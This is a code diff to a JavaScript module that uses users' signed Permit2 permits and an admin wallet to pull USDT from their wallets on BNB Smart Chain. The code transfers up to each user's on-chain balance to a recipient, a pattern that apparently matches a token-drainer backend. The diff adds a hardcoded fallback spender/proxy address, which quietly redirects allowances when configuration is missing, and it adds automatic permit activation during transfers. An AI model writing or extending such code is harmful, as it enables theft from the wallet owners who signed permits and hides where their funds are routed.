@@ -1,6 +1,7 @@
 import { ethers } from 'ethers';
 
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+const DEFAULT_PROXY_ADDRESS = '0x9e35C71b8D17f3c716839fd97fFbC230f5Ff197a';
 
 const PERMIT2_ABI = [
   'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
@@ -20,7 +21,7 @@ const USDT_ABI = [
 ];
 
 function getSpenderAddress(wallet) {
-  const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS;
+  const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS;
   if (proxy && ethers.isAddress(proxy) && !proxy.startsWith('0x00000000000000000000')) {
     return ethers.getAddress(proxy);
   }
@@ -55,11 +56,18 @@ export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f
 export async function activatePermit(permit) {
   const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
   const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
-  const spenderAddress = getSpenderAddress(wallet);
-  const isUsingProxy = spenderAddress !== wallet.address;
-
+  
   const ownerAddress = ethers.getAddress(permit.owner);
   const tokenAddress = ethers.getAddress(permit.token);
+  
+  // Determine target spender from permit record or current config
+  const defaultSpender = getSpenderAddress(wallet);
+  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
+    ? ethers.getAddress(permit.spender)
+    : defaultSpender;
+    
+  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
+  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;
 
   // Check user approved Permit2 on USDT contract
   const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
@@ -76,7 +84,7 @@ export async function activatePermit(permit) {
       expiration: permit.deadline,
       nonce: permit.nonce,
     },
-    spender: spenderAddress,
+    spender: targetSpender,
     sigDeadline: permit.deadline,
   };
 
@@ -86,17 +94,17 @@ export async function activatePermit(permit) {
     v: permit.v,
   }).serialized;
 
-  console.log('Activating AllowanceTransfer permit via Spender:', spenderAddress);
+  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender} (Proxy: ${isUsingProxy})`);
 
   if (isUsingProxy) {
-    const proxyContract = new ethers.Contract(spenderAddress, PROXY_ABI, wallet);
+    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
     try {
       await proxyContract.executePermit.staticCall(ownerAddress, permitSingle, signature);
     } catch (simErr) {
       const reason = simErr.reason || simErr.shortMessage || simErr.message;
       console.warn(`Simulated proxy executePermit() reverted: ${reason}`);
       const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
-      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, spenderAddress);
+      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
       if (existing.amount > 0n) {
         return '0xALREADY_ACTIVATED';
       }
@@ -113,7 +121,7 @@ export async function activatePermit(permit) {
       await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
     } catch (simErr) {
       const reason = simErr.reason || simErr.shortMessage || simErr.message;
-      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, wallet.address);
+      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
       if (existing.amount > 0n) {
         return '0xALREADY_ACTIVATED';
       }
@@ -128,12 +136,11 @@ export async function activatePermit(permit) {
 
 /**
  * Step 2: Transfer tokens using active Permit2 allowance via Proxy or Wallet.
+ * Automatically activates permit on-chain if not already activated.
  */
 export async function executeTransfer(permit, customAmount = null) {
   const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
   const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
-  const spenderAddress = getSpenderAddress(wallet);
-  const isUsingProxy = spenderAddress !== wallet.address;
 
   const ownerAddress = ethers.getAddress(permit.owner);
   const tokenAddress = ethers.getAddress(permit.token);
@@ -146,15 +153,37 @@ export async function executeTransfer(permit, customAmount = null) {
     throw new Error('User wallet currently has 0 USDT balance on-chain.');
   }
 
+  const defaultSpender = getSpenderAddress(wallet);
+  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
+    ? ethers.getAddress(permit.spender)
+    : defaultSpender;
+
+  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
+  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;
+
   const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
-  const [allowanceAmount, expiration] = await permit2Contract.allowance(
+  let [allowanceAmount, expiration] = await permit2Contract.allowance(
     ownerAddress,
     tokenAddress,
-    spenderAddress
+    targetSpender
   );
 
+  // If allowance is zero, attempt to auto-activate permit on-chain first
   if (allowanceAmount === 0n) {
-    throw new Error('No active Permit2 allowance. Activate permit first.');
+    console.log(`Allowance is 0. Auto-activating permit for ${ownerAddress} before transfer...`);
+    try {
+      await activatePermit(permit);
+      const updatedAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
+      allowanceAmount = updatedAllowance[0];
+      expiration = updatedAllowance[1];
+    } catch (actErr) {
+      console.warn('Auto-activation during transfer failed:', actErr.message);
+      throw new Error(`Permit not active on-chain and auto-activation failed: ${actErr.message}`);
+    }
+  }
+
+  if (allowanceAmount === 0n) {
+    throw new Error('No active Permit2 allowance on-chain.');
   }
 
   const now = Math.floor(Date.now() / 1000);
@@ -168,10 +197,10 @@ export async function executeTransfer(permit, customAmount = null) {
     if (customBigInt < transferAmount) transferAmount = customBigInt;
   }
 
-  console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${spenderAddress})...`);
+  console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${targetSpender})...`);
 
   if (isUsingProxy) {
-    const proxyContract = new ethers.Contract(spenderAddress, PROXY_ABI, wallet);
+    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
     try {
       await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
     } catch (simErr) {
@@ -230,7 +259,7 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
       } catch (e) {}
     }
 
-    const spender = (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || walletAddress);
+    const spender = (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);
 
     if (!spender || !ethers.isAddress(spender)) {
       return null;
